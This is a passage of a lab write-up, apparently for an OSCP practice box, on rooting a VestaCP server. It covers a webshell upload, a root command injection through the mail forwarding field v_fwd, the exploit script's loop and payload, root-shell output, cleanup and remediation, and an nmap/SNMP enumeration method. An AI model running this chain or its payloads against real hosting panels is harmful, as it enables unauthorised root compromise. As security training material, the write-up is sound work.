+<li>The upload path is <strong>absolute</strong>, supplied by the client. Nothing restricts it to the user's own
+  home. That is the CVE-2021-28379 shape, authenticated.</li>
+<li><code>public_html</code> is served by Apache with <code>mod_fcgid</code>, so PHP executes <strong>as <code>jack</code></strong> — the vhost
+  owner — not as <code>www-data</code>.</li>
+<li>The file lands owned by the vhost user with the right permissions, because the panel creates it.</li>
+</ul>
+<p>Call it with the vhost's <code>Host</code> header:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">"http://192.168.161.156/ownwebshell.php?password=e43c9f07ed59712efa492aa0ae259cd0&amp;e=id"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s1">'Host: 4wfarbc2dg.poc'</span>
+</pre></div>
+<p>The response body is whatever the command printed. Because Apache runs the file through
+<code>mod_fcgid</code>, that is the <strong>vhost owner</strong> — <code>jack</code> — not <code>www-data</code>. The <code>Host</code> header is required:
+without it nginx serves the 1055-byte placeholder vhost and the file is never reached.</p>
+<p>The script departs from a manual test here and goes straight on to the injection, so the webshell
+was verified in practice by the root shell it later carried commands for — not by a separate <code>id</code>
+call.</p>
+<h3>5.3 This is a foothold, not root</h3>
+<p><code>jack</code> is a normal system user with no administrative rights in the panel. A webshell as <code>jack</code> is a
+foothold, not a win. It is useful for two things only: proving execution, and giving us <strong>file
+handles we control</strong> for the next step.</p>
+<p>That second point is the whole reason it exists in this chain. Chapter 06 needs a directory the
+attacker can write a command into and read a result out of — <code>public_html</code> is exactly that, and the
+webshell provides both halves:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdtoexec    &lt;- we write the command here
+/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdresult    &lt;- root writes the output here
+</pre></div>
+<h3>5.4 Where the real bug is</h3>
+<p>Reading the mail-edit handler shows the shape of the problem. The panel takes the forwarding address
+and hands it to the mail script:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">r</span> <span class="o">=</span> <span class="n">us</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">targetHost</span> <span class="o">+</span> <span class="s1">'/api/v1/edit/mail/index.php?domain='</span> <span class="o">+</span> <span class="n">shellHost</span> <span class="o">+</span> <span class="s1">'&amp;account='</span> <span class="o">+</span> <span class="n">Vaccount</span><span class="p">,</span>
+            <span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+                <span class="s2">"save"</span><span class="p">:</span> <span class="s2">"save"</span><span class="p">,</span> <span class="s2">"token"</span><span class="p">:</span> <span class="n">getSession</span><span class="p">(</span><span class="n">us</span><span class="p">,</span> <span class="n">targetHost</span><span class="p">,</span> <span class="mi">2</span><span class="p">)[</span><span class="s1">'token'</span><span class="p">],</span>
+                <span class="s2">"v_domain"</span><span class="p">:</span> <span class="n">shellHost</span><span class="p">,</span> <span class="s2">"v_password"</span><span class="p">:</span> <span class="s1">''</span><span class="p">,</span> <span class="s2">"v_quota"</span><span class="p">:</span> <span class="s2">"unlimited"</span><span class="p">,</span>
+                <span class="s2">"v_aliases"</span><span class="p">:</span> <span class="s1">''</span><span class="p">,</span> <span class="s2">"v_fwd"</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span> <span class="s2">"v_credentials"</span><span class="p">:</span> <span class="s1">''</span><span class="p">,</span>
+                <span class="s2">"Username"</span><span class="p">:</span> <span class="s2">"@"</span> <span class="o">+</span> <span class="n">shellHost</span><span class="p">,</span> <span class="s2">"v_account"</span><span class="p">:</span> <span class="n">Vaccount</span><span class="p">,</span> <span class="s2">"Password"</span><span class="p">:</span> <span class="s1">''</span><span class="p">})</span>
+</pre></div>
+<p><code>v_fwd</code> is an email forwarding address — user-controlled free text. It is interpolated into the
+command line of <code>v-edit-mail-account</code>, which the panel invokes through
+<code>/usr/bin/sudo</code>. The next chapter closes the loop.</p>
+<h3>5.5 The full script</h3>
+<p>The whole chain — domain creation, upload, mailbox creation, injection — is in
+<a href="https://github.com/AV10V/OSCP/blob/main/labs/192.168.161.156-vesta-snmp/scripts/vesta-rce-exploit.py"><code>scripts/vesta-rce-exploit.py</code></a>. It is a standalone single file and
+needs only <code>requests</code>.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>.venv<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>.<span class="w"> </span>.venv/bin/activate
+pip<span class="w"> </span>install<span class="w"> </span>requests
+python3<span class="w"> </span>scripts/vesta-rce-exploit.py<span class="w"> </span>https://192.168.161.156:8083<span class="w"> </span>jack<span class="w"> </span><span class="s1">'3PUKsX98BMupBiCf'</span>
+</pre></div>
+<p>Its <code>main()</code> is the chain in twelve lines:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">ip</span>         <span class="o">=</span> <span class="n">getIPfromHostname</span><span class="p">(</span><span class="n">target_host</span><span class="p">)</span>
+<span class="n">pwn_domain</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">get_random_string</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="si">}</span><span class="s2">.poc"</span>
+<span class="n">session</span>    <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="n">login</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+<span class="n">getWebshell</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">pwn_domain</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">ip</span><span class="p">)</span>
+<span class="n">mailbox</span> <span class="o">=</span> <span class="n">createMailBox</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">pwn_domain</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+<span class="n">editMailBox</span><span class="p">(</span><span class="o">...</span><span class="p">,</span> <span class="s1">'testPayload'</span><span class="p">)</span>                      <span class="c1"># verify the field is injectable</span>
+
+<span class="n">backdoor_payload</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">f</span><span class="s2">"';bash&lt;/home/</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">/web/</span><span class="si">{</span><span class="n">pwn_domain</span><span class="si">}</span><span class="s2">/public_html/iamroot/cmdtoexec&gt;"</span>
+    <span class="sa">f</span><span class="s2">"/home/</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">/web/</span><span class="si">{</span><span class="n">pwn_domain</span><span class="si">}</span><span class="s2">/public_html/iamroot/cmdresult;A='"</span>
+<span class="p">)</span>
+<span class="n">editMailBox</span><span class="p">(</span><span class="o">...</span><span class="p">,</span> <span class="n">backdoor_payload</span><span class="p">)</span>                   <span class="c1"># root context fires here</span>
+
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"# "</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">deploycommand</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">pwn_domain</span><span class="p">)</span>               <span class="c1"># webshell writes cmdtoexec</span>
+    <span class="n">editMailBox</span><span class="p">(</span><span class="o">...</span><span class="p">,</span> <span class="s2">"foobar"</span><span class="p">)</span>                       <span class="c1"># re-trigger the injection</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">queryWebshell</span><span class="p">(</span><span class="s1">'echo `cat ./iamroot/cmdresult;`;'</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">pwn_domain</span><span class="p">))</span>
+</pre></div>
+<p>Two design notes:</p>
+<ul>
+<li><code>editMailBox(..., 'testPayload')</code> first is a <strong>capability check</strong>. If the edit fails, the whole
+  chain stops before creating a backdoor — better than leaving half an exploit on the box.</li>
+<li>Each command costs three HTTP requests. It is not a socket; it is a stateless request loop, which
+  is why it feels slow.</li>
+</ul></div></section>
+<section class="chapter" id="ch-06" data-title="Privilege escalation"><div class="ch-head"><span class="ch-num">06</span><div class="ch-title"><h2>Privilege escalation</h2><p class="ch-sub">A forwarding address that runs as root</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The foothold in chapter 05 executes as <code>jack</code>. This chapter does not need a kernel bug, a setuid
+binary, or a cron job. It abuses the panel's own privilege: a normal user's input reaches a script
+the panel runs through <code>sudo</code>.</p>
+<hr />
+<h3>6.1 The privileged call</h3>
+<p>Every mail action is a wrapper around <code>/usr/local/vesta/bin/v-edit-mail-account</code>:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="x">define('VESTA_CMD', '/usr/bin/sudo /usr/local/vesta/bin/');</span>
+</pre></div>
+<p>The panel builds a shell command string from the request. <code>v_fwd</code> — the forwarding address — is
+interpolated into it. <code>v-edit-mail-account</code> then writes the forwarding into the Dovecot/Exim config,
+and it is executed with root rights because the panel's <code>sudoers</code> rule allows it.</p>
+<p>That is the whole boundary. A customer-supplied string becomes part of a root shell command line.
+Quoting is the only control, and quoting is defeated by a single <code>'</code>.</p>
+<h3>6.2 Why one injection is not enough</h3>
+<p>Naively you would send <code>; id</code> and read the output. Two problems:</p>
+<ol>
+<li><strong>The output does not come back to you.</strong> The panel captures the script's stdout into its own
+   HTTP response — which you receive, but only as the panel's formatting, and only for the <em>first</em>
+   command in the string. Anything appended after it is invisible.</li>
+<li><strong>The command must not break the panel's own command line.</strong> If the trailing quote is left
+   unbalanced, the shell errors out and the panel returns a failure — and you learn nothing.</li>
+</ol>
+<p>So the payload has to survive being embedded, and it has to give us our own input/output channel.
+Which is what the webshell from chapter 05 is for.</p>
+<h3>6.3 Payload anatomy</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>';bash&lt;/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdtoexec&gt;/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/cmdresult;A='
+</pre></div>
+<p>Four parts:</p>
+<table>
+<thead>
+<tr>
+<th>Fragment</th>
+<th>Job</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>';</code></td>
+<td>close the panel's quoted argument and start a new command</td>
+</tr>
+<tr>
+<td><code>bash&lt;…cmdtoexec&gt;…cmdresult</code></td>
+<td>run whatever is in <code>cmdtoexec</code>, write stdout to <code>cmdresult</code></td>
+</tr>
+<tr>
+<td><code>;</code></td>
+<td>end that command</td>
+</tr>
+<tr>
+<td><code>A='</code></td>
+<td>reopen a quote so the panel's remaining command line stays balanced</td>
+</tr>
+</tbody>
+</table>
+<p>It contains <strong>no spaces</strong>. That matters: the value travels as a form field through several layers,
+and a space-free payload survives quoting, <code>IFS</code> splitting and any naive word-splitting on the way.
+<code>&lt;</code> and <code>&gt;</code> do the argument separation that spaces would normally do.</p>
+<p>The result is a file-based command channel:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>webshell writes  →  public_html/iamroot/cmdtoexec
+injection runs   →  bash cmdtoexec &gt; cmdresult        (as root)
+webshell reads   →  public_html/iamroot/cmdresult
+</pre></div>
+<p><code>public_html</code> is writable by <code>jack</code> and readable through Apache, so both ends are ours. The
+<em>execution</em> is root's.</p>
+<h3>6.4 Second-order injection</h3>
+<p>This is not reflected injection. The dangerous value is <strong>stored</strong> first — as a mailbox forwarding
+address, in the mail configuration — and evaluated later, by a different process, with different
+privileges:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>1. POST /api/v1/edit/mail/index.php     →  v_fwd stored     (request as jack)
+2. v-edit-mail-account runs under sudo  →  value evaluated  (process as root)
+</pre></div>
+<p>Two consequences follow, and both are useful beyond this box:</p>
+<ul>
+<li><strong>Input filtering at the API layer is the wrong place to look.</strong> The value is legal free text for
+  a forwarding address. It is only dangerous where it is <em>used</em>.</li>
+<li><strong>The trigger is repeatable.</strong> Re-saving the mailbox re-runs the script, which is exactly how the
+  script's command loop works: write <code>cmdtoexec</code>, re-save the mailbox with <code>v_fwd=foobar</code> to
+  re-trigger, read <code>cmdresult</code>.</li>
+</ul>
+<h3>6.5 Running it</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>scripts/vesta-rce-exploit.py<span class="w"> </span>https://192.168.161.156:8083<span class="w"> </span>jack<span class="w"> </span><span class="s1">'3PUKsX98BMupBiCf'</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>[INFO] Attempting login to https://192.168.161.156:8083 as jack
+[+] Logged in as jack
+[INFO] Checking for existing webshell or creating one
+[!] 4wfarbc2dg.poc not found, creating one...
+[+] 4wfarbc2dg.poc added
+[+] 4wfarbc2dg.poc found, looking up webshell
+[!] webshell not found, creating one..
+[+] Webshell uploaded
+[INFO] Creating mailbox on domain 4wfarbc2dg.poc
+[!] Mail domain not found, creating one..
+[+] Mail domain created
+[+] Mail account created
+[INFO] Editing mailbox to test payload
+[INFO] Deploying backdoor via mailbox editing
+[INFO] [+] Root shell possibly obtained. Enter commands:
+## id
+uid=0(root) gid=0(root) groups=0(root)
+</pre></div>
+<p>Note the honest wording in the script: <strong>“possibly obtained”</strong>. It is a blind injection — the script
+cannot know whether the command ran until it reads <code>cmdresult</code> back. <code>id</code> returning <code>uid=0</code> is the
+actual proof.</p>
+<h3>6.6 Reading the result</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## id</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+
+<span class="c1">## pwd</span>
+/usr/local/vesta/web/api/v1/edit/mail
+
+<span class="c1">## cat /root/proof.txt</span>
+d4640a77ca31e0ab126751f98e819888
+
+<span class="c1">## cat /home/jack/local.txt</span>
+9cfca959e54738e70905a4024d16a44a
+</pre></div>
+<p>That <code>pwd</code> is the most interesting line in the whole box. <strong>The working directory of the root shell
+is <code>/usr/local/vesta/web/api/v1/edit/mail</code></strong> — the cwd of the PHP request handler that invoked
+<code>v-edit-mail-account</code>. The root command inherited it.</p>
+<p>Forensically that is a fingerprint: a root process whose cwd is a web request directory means
+panel-level command injection, not a binary exploit. On the defensive side, that is where you look
+first.</p>
+<h3>6.7 What actually gave root</h3>
+<p>Worth being precise, because "Vesta is vulnerable" is not an explanation:</p>
+<ul>
+<li><code>sudoers</code> permits the panel account to run <code>/usr/local/vesta/bin/v-*</code> <strong>as root</strong>, without
+  argument restrictions. Any argument the panel passes is therefore root-controlled data.</li>
+<li><code>v-edit-mail-account</code> builds a shell command line by string concatenation and does not quote
+  <code>v_fwd</code> as a single token.</li>
+<li>The API treats <code>v_fwd</code> as unvalidated free text, because a forwarding address legitimately is.</li>
+</ul>
+<p>Remove any one of those three and the chain breaks.</p>
+<h3>6.8 Routes present but not used</h3>
+<p>Recorded as hypotheses, not results — none of these were exercised on this box:</p>
+<table>
+<thead>
+<tr>
+<th>Route</th>
+<th>Why it is plausible</th>
+<th>Status</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Exim <code>${run{}}</code> <strong>from a local shell</strong></td>
+<td><code>4.90_1</code> predates the June-2019 fix unless the Ubuntu revision is <code>-1ubuntu1.2</code>; local exploitation needs no <code>local_part_suffix</code></td>
+<td>untested — <code>dpkg -l exim4-daemon-light</code> after a shell decides it</td>
+</tr>
+<tr>
+<td>Vesta API-key LPE (#2045)</td>
+<td>Any non-empty key in <code>/usr/local/vesta/data/keys/</code> allows escalation via <code>v-generate-api-key</code></td>
+<td>untested — <code>ls -la /usr/local/vesta/data/keys/</code></td>
+</tr>
+<tr>
+<td>CVE-2019-0211 (Apache 2.4.29)</td>
+<td>Local privesc, reachable from a shared-memory write in an Apache worker</td>
+<td>untested — needs execution inside a worker</td>
+</tr>
+</tbody>
+</table>
+<p>The remote Exim path was ruled out earlier: the server answered <code>550 Restricted characters in
+address</code> for a payload containing <code>/</code>, which is Debian's stock ACL, and stock Debian ships without
+<code>local_part_suffix</code>. With no address extensions, <code>${run{}}</code> cannot be reached over SMTP. That is a
+<em>config</em> conclusion, not a patch-state conclusion — which is why the <code>dpkg</code> check is still listed
+above.</p>
+<h3>6.9 Why we did not need any of them</h3>
+<p>The panel route was fast and deterministic once the credential existed: one script, one injection,
+root. Every extra branch is time you spend while the box is already owned.</p>
+<p>The lesson generalises. On a hosting panel, enumerate the <code>v-*</code> surface before you look for binary
+exploits — the panel's own privilege model is the vulnerability.</p></div></section>
+<section class="chapter" id="ch-07" data-title="Flags and cleanup"><div class="ch-head"><span class="ch-num">07</span><div class="ch-title"><h2>Flags &amp; cleanup</h2><p class="ch-sub">Proof, debris, remediation, lessons</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Two flags, one root shell, and a non-trivial amount of debris to remove.</p>
+<hr />
+<h3>7.1 Flags</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## whoami &amp;&amp; ifconfig</span>
+root
+
+<span class="c1">## cat /root/proof.txt</span>
+d4640a77ca31e0ab126751f98e819888
+
+<span class="c1">## cat /home/jack/local.txt</span>
+9cfca959e54738e70905a4024d16a44a
+</pre></div>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Path</th>
+<th>Context</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>local.txt</code></td>
+<td><code>/home/jack/local.txt</code></td>
+<td>the panel user the SNMP extend leaked</td>
+</tr>
+<tr>
+<td><code>proof.txt</code></td>
+<td><code>/root/proof.txt</code></td>
+<td>root, via the mailbox injection</td>
+</tr>
+</tbody>
+</table>
+<p><code>local.txt</code> sitting in <code>jack</code>'s home is consistent with the intended path: the box expects you to
+land as <code>jack</code> first. The SNMP leak is the intended front door, and it hands you exactly that
+account.</p>
+<h3>7.2 What the exploit left behind</h3>
+<p>The script creates real state on the target. If this were a client engagement rather than a lab,
+each of these would need to be documented and removed:</p>
+<table>
+<thead>
+<tr>
+<th>Artifact</th>
+<th>Location</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>web domain</td>
+<td><code>4wfarbc2dg.poc</code> — <code>/home/jack/web/4wfarbc2dg.poc/</code></td>
+</tr>
+<tr>
+<td>webshell</td>
+<td><code>/home/jack/web/4wfarbc2dg.poc/public_html/ownwebshell.php</code></td>
+</tr>
+<tr>
+<td>command channel</td>
+<td><code>/home/jack/web/4wfarbc2dg.poc/public_html/iamroot/</code></td>
+</tr>
+<tr>
+<td>mail domain</td>
+<td><code>4wfarbc2dg.poc</code></td>
+</tr>
+<tr>
+<td>mail account</td>
+<td>random account under that domain</td>
+</tr>
+<tr>
+<td>mailbox forwarding</td>
+<td>the injected payload, stored in the mail config</td>
+</tr>
+<tr>
+<td>DNS records</td>
+<td>vhost + mail records created by <code>v-add-web-domain</code> / <code>v-add-mail-domain</code></td>
+</tr>
+</tbody>
+</table>
+<p>The mailbox forwarding entry is the one people forget. It is <strong>stored</strong> — it persists after you drop
+the shell, and it re-executes the payload every time the mailbox is saved.</p>
+<h3>7.3 Cleanup</h3>
+<p>Remove the domain through the panel (the panel cleans up its own nginx/Apache/DNS state, which is
+safer than <code>rm -rf</code>):</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">TOK</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>-sk<span class="w"> </span>https://192.168.161.156:8083/api/v1/login/session.php<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oE<span class="w"> </span><span class="s1">'"token":"[a-f0-9]+"'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">'"'</span><span class="w"> </span>-f4<span class="k">)</span>
+
+<span class="c1">## 1. delete the mail domain (removes the account and its forwarding)</span>
+curl<span class="w"> </span>-sk<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">"https://192.168.161.156:8083/api/v1/delete/mail/index.php?domain=4wfarbc2dg.poc&amp;token=</span><span class="nv">$TOK</span><span class="s2">"</span>
+
+<span class="c1">## 2. delete the web domain (removes public_html, the webshell and iamroot/)</span>
+curl<span class="w"> </span>-sk<span class="w"> </span>-b<span class="w"> </span>cookies.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">"https://192.168.161.156:8083/api/v1/delete/web/index.php?domain=4wfarbc2dg.poc&amp;token=</span><span class="nv">$TOK</span><span class="s2">"</span>
+</pre></div>
+<p>Then verify — from the shell, not from the panel's response:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ls<span class="w"> </span>-la<span class="w"> </span>/home/jack/web/<span class="w">           </span><span class="c1"># 4wfarbc2dg.poc must be gone</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/etc/exim4/domains/<span class="w">       </span><span class="c1"># no 4wfarbc2dg.poc</span>
+grep<span class="w"> </span>-r<span class="w"> </span>4wfarbc2dg<span class="w"> </span>/etc/nginx/conf.d/<span class="w"> </span>/etc/apache2/sites-enabled/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</pre></div>
+<p>If the forwarding entry survives in <code>/etc/exim4/domains/*/aliases</code>, the injection is still live even
+after the domain is deleted. Check it explicitly.</p>
+<h3>7.4 Defensive remediation</h3>
+<p>In priority order:</p>
+<ol>
+<li><strong>Do not interpolate user input into <code>v-*</code> shell calls.</strong> Pass arguments as an array, quote with
+   <code>"$@"</code>, and stop the blanket <code>sudo</code> rule that lets a panel user run every <code>v-*</code> script as root.</li>
+<li><strong>Fix SNMP.</strong> Non-default community, ACL to management hosts, or disable the daemon. Then audit
+   <code>nsExtendConfigTable</code> for every secret that has ever appeared in an extend argument — those
+   secrets are compromised, not merely exposed.</li>
+<li><strong>Rotate <code>jack</code>.</strong> A credential published over SNMP for months is burned.</li>
+<li><strong>Constrain the upload API.</strong> Absolute <code>dir</code> parameters should not be client-controlled; enforce
+   an allow-list and keep writable paths outside any docroot.</li>
+<li><strong>Bind MySQL to <code>127.0.0.1</code></strong> and restrict 8083 to VPN or source-IP allow-lists.</li>
+<li><strong>Migrate off VestaCP.</strong> Upstream stalled for years and this class of injection is endemic to
+   its design. HestiaCP is the maintained fork.</li>
+</ol>
+<h3>7.5 Lessons</h3>
+<p><strong>Run a UDP scan first.</strong> This box was decided by <code>nmap -sU -p 161</code>. The full TCP sweep, the four
+SMTP listeners, the panel version — all of it was noise until a UDP packet returned a password.</p>
+<p><strong>Version banners are hints, not gates.</strong> Time went into <code>Exim 4.90_1</code> / CVE-2019-10149 on the
+strength of a banner string that cannot distinguish a patched Ubuntu build from a vulnerable one. The
+config answered faster than the version did: <code>550 Restricted characters in address</code> is Debian's
+stock ACL, and stock Debian has no <code>local_part_suffix</code>, so the remote path was never reachable.</p>
+<p><strong>Stop when a service says no twice.</strong> SMTP gave a syntax error, then an ACL denial. That was the
+answer. Everything after was sunk cost.</p>
+<p><strong>Identical response sizes mean one file.</strong> <code>/</code> and <code>/upload/index.php</code> both returned 2586 bytes
+because <code>upload/index.php</code> is a 66-byte stub that includes the SPA shell. Two "endpoints" with the
+same length are one endpoint.</p>
+<p><strong>On a panel box, read the <code>v-*</code> surface.</strong> The question is not whether an injection exists, but
+which field reaches a <code>v-*</code> script. <code>v_fwd</code> is an email forwarding address — free text by design,
+evaluated as root by design.</p>
+<p><strong>Second-order beats first-order.</strong> The value was legal where it was stored and only dangerous where
+it was used. Input validation at the API was never going to catch it.</p></div></section>
+<section class="chapter" id="ch-08" data-title="Methodology"><div class="ch-head"><span class="ch-num">08</span><div class="ch-title"><h2>Methodology</h2><p class="ch-sub">The repeatable per-box loop</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The loop I run on every box, in order, with the rule that makes each step worth its time. This is
+deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only
+where evidence points.</p>
+<hr />
+<h3>Phase 0 — Setup</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mkdir<span class="w"> </span>-p<span class="w"> </span>/tmp/&lt;box&gt;<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/tmp/&lt;box&gt;
+<span class="nb">export</span><span class="w"> </span><span class="nv">TARGET</span><span class="o">=</span>&lt;ip&gt;
+</pre></div>
+<p>Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the
+report afterwards trivial and stops me confusing two boxes' output.</p>
+<hr />
+<h3>Phase 1 — Reachability and TCP</h3>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Command</th>
+<th>Rule</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ping</td>
+<td><code>ping -c 2 -W 2 $TARGET</code></td>
+<td>TTL tells you the OS before you scan (64 Linux, 128 Windows)</td>
+</tr>
+<tr>
+<td>Full TCP</td>
+<td><code>nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET</code></td>
+<td><strong>Always <code>-p-</code>.</strong> A top-1000 scan is a guess</td>
+</tr>
+<tr>
+<td>Versions</td>
+<td><code>nmap -sV -sC -p&lt;open&gt; -oN services.txt $TARGET</code></td>
+<td>Only the open ports; <code>-sC</code> is cheap and occasionally decisive</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Decision:</strong> for each open port, ask "what is the <em>configuration</em> weakness most likely to be, given
+this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.</p>
+<hr />
+<h3>Phase 2 — UDP (do not skip this)</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$TARGET</span>
+</pre></div>
+<p>If <code>161/udp</code> is open:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="k">done</span>
+</pre></div>
+<p>Then, on success, always:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2<span class="w">   </span><span class="c1"># nsExtendTable — the money tree</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w">   </span><span class="c1"># process names</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w">   </span><span class="c1"># installed packages</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">     </span>#<span class="w"> </span>interface<span class="w"> </span>IPs
